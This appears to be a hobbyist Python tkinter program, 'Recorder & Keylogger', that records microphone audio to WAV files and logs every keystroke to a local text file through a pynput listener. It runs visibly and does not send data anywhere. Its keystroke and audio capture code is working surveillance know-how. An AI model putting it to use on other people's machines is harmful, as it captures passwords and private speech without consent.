import os
import sounddevice as sd
from scipy.io.wavfile import write
from fileinput import filename
from pynput.keyboard import Listener, Key
import tkinter as tk
from tkinter import ttk
import threading


log_file = "keys_log.txt"
audio_information = "audio.wav"

# Record audio settings
microphone_time = 5  # seconds
fs = 44100  # Sample rate

def microphone():
    audio_count = 1

    while os.path.exists(f"audio_{audio_count}.wav"):
        audio_count += 1

    filename = f"audio_{audio_count}.wav"

    print(f"Recording {filename}...")

    recording = sd.rec(
        int(microphone_time * fs),
        samplerate=fs,
        channels=1,
        dtype="int16"
    )
    sd.wait()

    write(filename, fs, recording)
    print(f"Saved {filename}")

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f"[{key}]")

        # Stop when Esc is pressed
        if key == Key.esc:
            return False


class App:
    def __init__(self, root):
        self.root = root
        self.root.title("Recorder & Keylogger")
        self.root.geometry("400x420")
        self.root.resizable(False, False)

        # State for keylogger thread
        self.listener = None
        self.listener_thread = None
        self.keylogger_running = False
        self.recording_running = False

        # ── Title ──
        title_label = tk.Label(root, text="Recorder & Keylogger", font=("Arial", 14, "bold"))
        title_label.pack(pady=(10, 2))

        # Made by label
        made_by = tk.Label(root, text="Made by Abiral Kunwar", font=("Arial", 8, "italic"), fg="gray")
        made_by.pack(pady=(0, 10))

        # ── Option Menu Box ──
        option_frame = ttk.LabelFrame(root, text=" Options ", padding=10)
        option_frame.pack(fill="x", padx=20, pady=5)

        # Time input inside box
        time_frame = ttk.Frame(option_frame)
        time_frame.pack(fill="x", pady=5)

        ttk.Label(time_frame, text="Recording time (seconds):").pack(side="left", padx=(0, 5))
        self.time_var = tk.IntVar(value=5)
        self.time_spinbox = ttk.Spinbox(time_frame, from_=1, to=60, textvariable=self.time_var, width=8)
        self.time_spinbox.pack(side="left")

        # ── Buttons ──
        btn_frame = ttk.LabelFrame(root, text=" Controls ", padding=10)
        btn_frame.pack(fill="x", padx=20, pady=5)

        self.record_btn = tk.Button(btn_frame, text="▶ Record Audio", command=self.start_record,
                                    bg="#4caf50", fg="white", font=("Arial", 10, "bold"),
                                    relief="flat", padx=10, pady=4, cursor="hand2",
                                    activebackground="#45a049", activeforeground="white")
        self.record_btn.pack(fill="x", pady=3)
        
        self.keylog_btn = tk.Button(btn_frame, text="▶ Start Keylogger", command=self.toggle_keylogger,
                                    bg="#2196f3", fg="white", font=("Arial", 10, "bold"),
                                    relief="flat", padx=10, pady=4, cursor="hand2",
                                    activebackground="#1976d2", activeforeground="white")
        self.keylog_btn.pack(fill="x", pady=3)

        self.exit_btn = tk.Button(btn_frame, text="Exit", command=self.on_exit,
                                  bg="#f44336", fg="white", font=("Arial", 10, "bold"),
                                  relief="flat", padx=10, pady=4, cursor="hand2",
                                  activebackground="#d32f2f", activeforeground="white")
        self.exit_btn.pack(fill="x", pady=3)

        # ── Status ──
        status_frame = ttk.LabelFrame(root, text=" Status ", padding=10)
        status_frame.pack(fill="x", padx=20, pady=5)

        self.status_label = ttk.Label(status_frame, text="Ready")
        self.status_label.pack()

        self.root.protocol("WM_DELETE_WINDOW", self.on_exit)

    def start_record(self):
        if self.recording_running:
            return
        
        # Update the global microphone_time with user input
        global microphone_time
        microphone_time = self.time_var.get()
        
        self.recording_running = True
        self.status_label.config(text=f"Recording audio for {microphone_time}s...")
        self.record_btn.config(state="disabled")
        threading.Thread(target=self._run_microphone, daemon=True).start()

    def _run_microphone(self):
        microphone()
        self.root.after(0, self._record_done)

    def _record_done(self):
        self.recording_running = False
        self.status_label.config(text="Audio saved")
        self.record_btn.config(state="normal")

    def toggle_keylogger(self):
        if not self.keylogger_running:
            self.keylogger_running = True
            self.keylog_btn.config(text="■ Stop Keylogger")
            self.status_label.config(text="Keylogger running...")
            self.listener_thread = threading.Thread(target=self._run_listener, daemon=True)
            self.listener_thread.start()
        else:
            if self.listener:
                self.listener.stop()
            self.keylogger_running = False
            self.keylog_btn.config(text="▶ Start Keylogger")
            self.status_label.config(text="Keylogger stopped")

    def _run_listener(self):
        with Listener(on_press=on_press) as listener:
            self.listener = listener
            listener.join()
        self.root.after(0, self._listener_stopped)

    def _listener_stopped(self):
        self.keylogger_running = False
        self.keylog_btn.config(text="▶ Start Keylogger")
        self.status_label.config(text="Keylogger stopped (Esc)")

    def on_exit(self):
        if self.listener:
            self.listener.stop()
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()